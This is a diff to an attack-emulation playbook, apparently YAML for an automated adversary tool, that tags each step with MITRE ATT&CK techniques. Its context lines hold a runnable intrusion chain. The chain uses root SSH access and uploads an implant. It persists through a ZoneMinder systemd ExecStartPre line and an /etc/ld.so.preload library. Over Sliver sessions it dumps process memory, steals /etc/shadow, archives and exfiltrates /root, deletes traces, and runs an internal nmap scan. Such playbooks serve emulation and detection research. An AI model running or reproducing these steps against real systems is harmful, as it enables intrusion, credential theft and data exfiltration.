@@ -25,8 +25,8 @@ commands:
     key_filename: $SSH_KEY
     creates_session: "root"
     metadata:
-      techniques: "T1033"
-      tactics: "Discovery"
+      techniques: "T1021"
+      tactics: "Lateral Movement"
 
   - type: mktemp
     cmd: dir
@@ -52,6 +52,9 @@ commands:
     remote_path: $FATHER_INSTALLPATH
     mode: "0644"
     session: root
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
 
   - type: shell
     cmd: sudo rm -rf $FATHERCHROOT/rootjail
@@ -66,6 +69,9 @@ commands:
     cmd: start_https_listener
     host: "0.0.0.0"
     port: "443"
+    metadata:
+      techniques: "T1071,T1573"
+      tactics: "Command and Control"
 
   - type: shell
     cmd: ls $IMPLANTPATH
@@ -76,68 +82,109 @@ commands:
     remote_path: /usr/bin/zmcontroller
     mode: "755"
     session: "root"
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
    
-
   - type: ssh
     cmd: "vim /etc/systemd/system/multi-user.target.wants/zoneminder.service\n"
     interactive: True
     session: "root"
+    metadata:
+      techniques: "T1543,T1569,T1037"    
+      tactics: "Persistence"
 
   - type: ssh
     cmd: ":inoremap jj <ESC>\n"
     interactive: True
     session: "root"
+    metadata:
+      techniques: "T1543"  
+      tactics: "Persistence"
 
   - type: ssh
     interactive: True
     cmd: "/[Service\n"
     session: "root"
+    metadata:
+      techniques: "T1543"  
+      tactics: "Persistence"
 
   - type: ssh
     cmd: "o"
     interactive: True
     session: "root"
+    metadata:
+      techniques: "T1543"  
+      tactics: "Persistence"
 
   - type: ssh
     cmd: ExecStartPre=sudo -g fax bash -c "/usr/bin/zmcontroller &"
     interactive: True
     session: "root"
+    metadata:
+      techniques: "T1543,T1569"  
+      tactics: "Persistence"
 
   - type: ssh
     cmd: "jj"
     interactive: True
     session: "root"
+    metadata:
+      techniques: "T1543"  
+      tactics: "Persistence"
 
   - type: ssh
     cmd: ":wq!\n"
     interactive: True
     session: "root"
+    metadata:
+      techniques: "T1543"  
+      tactics: "Persistence"
 
   - type: ssh
     cmd: "echo /usr/lib/selinux.so.3 >> /etc/ld.so.preload"
     session: root
+    metadata:
+      techniques: "T1014,T1564,T1574"  
+      tactics: "Persistence"
 
   - type: ssh
     cmd: systemctl daemon-reload
     session: root
+    metadata:
+      techniques: "T1543" 
+      tactics: "Persistence"
 
   - type: ssh
     cmd: systemctl restart zoneminder.service
     session: root
+    metadata:
+      techniques: "T1543"  
+      tactics: "Persistence"
 
   - type: sliver-session
     cmd: ls
     remote_path: "."
     session: superimplant
+    metadata:
+      techniques: "T1083"  
+      tactics: "Discovery"
 
   - type: sliver-session
     cmd: ps
     session: superimplant
+    metadata:
+      techniques: "T1057" 
+      tactics: "Discovery"
 
   - type: regex
     cmd: (\d+) .*mariadb
     output:
       PROCESS: "$MATCH_0"
+    metadata:
+      techniques: "T1007"  
+      tactics: "Discovery"
 
   - type: debug
     cmd: "$PROCESS"
@@ -150,14 +197,23 @@ commands:
     pid: "1"
     session: superimplant
     local_path: $TEMPPROCDUMP
+    metadata:
+      techniques: "T1003"  
+      tactics: "Credential Access"
 
   - type: sliver-session
     cmd: netstat
     session: superimplant
+    metadata:
+      techniques: "T1049"  
+      tactics: "Discovery"
 
   - type: sliver-session
     cmd: ifconfig
     session: superimplant
+    metadata:
+      techniques: "T1016" 
+      tactics: "Discovery"
 
   - type: mktemp
     variable: SHADOW
@@ -167,6 +223,9 @@ commands:
     remote_path: /etc/shadow
     local_path: $SHADOW
     session: superimplant
+    metadata:
+      techniques: "T1003"  
+      tactics: "Credential Access"
 
   - type: sliver-session
     cmd: execute
@@ -176,6 +235,9 @@ commands:
       - /tmp/r.tar.gz
       - /root
     session: superimplant
+    metadata:
+      techniques: "T1560,T1074,T1005"
+      tactics: "Collection,Exfiltration"
 
   - type: mktemp
     variable: ROOTTAR
@@ -188,11 +250,17 @@ commands:
     remote_path: /tmp/r.tar.gz
     local_path: $ROOTTAR
     session: superimplant
+    metadata:
+      techniques: "T1041"
+      tactics: "Exfiltration"
 
   - type: sliver-session
     cmd: rm
     remote_path: /tmp/r.tar.gz
     session: superimplant
+    metadata:
+      techniques: "T1070"
+      tactics: "Defense Evasion"
 
   - type: sliver-session
     cmd: download
@@ -200,6 +268,9 @@ commands:
     local_path: $ROOTTAR2
     recurse: True
     session: superimplant
+    metadata:
+      techniques: "T1005"
+      tactics: "Collection"
 
   - type: sliver-session
     cmd: execute
@@ -207,6 +278,9 @@ commands:
     args:
       - /etc/pam.d/common-password
     session: superimplant
+    metadata:
+      techniques: "T1201"
+      tactics: "Discovery"
 
   - type: sliver-session
     cmd: execute
@@ -214,6 +288,9 @@ commands:
     args:
       - /etc/passwd
     session: superimplant
+    metadata:
+      techniques: "T1087"
+      tactics: "Discovery"
 
   - type: sliver-session
     cmd: execute
@@ -222,12 +299,18 @@ commands:
       - -l
       - $USER
     session: superimplant
+    metadata:
+      techniques: "T1201"
+      tactics: "Discovery"
 
   - type: sliver-session
     cmd: upload
     local_path: /var/www/html/nmap
     remote_path: /tmp/nmap
     session: superimplant
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
 
   - type: sliver-session
     cmd: execute
@@ -236,6 +319,9 @@ commands:
       - "755"
       - /tmp/nmap
     session: superimplant
+    metadata:
+      techniques: "T1106"
+      tactics: "Execution"
 
   - type: sliver-session
     cmd: execute
@@ -243,3 +329,6 @@ commands:
     args:
       - "172.17.100.0/24"
     session: superimplant
+    metadata:
+      techniques: "T1046,T1018"
+      tactics: "Discovery"
